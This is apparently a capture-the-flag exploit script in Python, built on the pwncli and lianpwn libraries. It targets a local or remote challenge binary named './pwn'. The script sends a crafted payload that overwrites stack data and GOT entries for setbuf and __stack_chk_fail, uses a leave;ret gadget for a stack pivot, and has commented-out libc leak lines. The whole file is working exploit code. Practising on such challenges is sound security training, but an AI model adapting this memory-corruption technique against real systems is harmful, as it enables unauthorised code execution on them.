#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

leave_ret = 0x00000000004013A3

ru(b"What is your first name? ")
payload = flat(
    {
        # 0x000: elf.sym.main,
        0x000: 0x40145A,
        0x0D0: elf.got.setbuf,
        0x110: [
            0xDEADBEEF,
            0xCAFECAFE,
        ],
        0x130: elf.got.__stack_chk_fail,
        0x140: 0xCAFECAFE,
    }
)
sl(payload)

ru(b"How old are you? ")
sl(i2b(0x404100))

# leak_setbuf = u64_ex(rn(8))
# leak__ZNSt8ios_base4InitC1Ev = u64_ex(rn(8))
# lg("leak_libc", leak_setbuf)
# lg("leak_cpp", leak__ZNSt8ios_base4InitC1Ev)

ia()
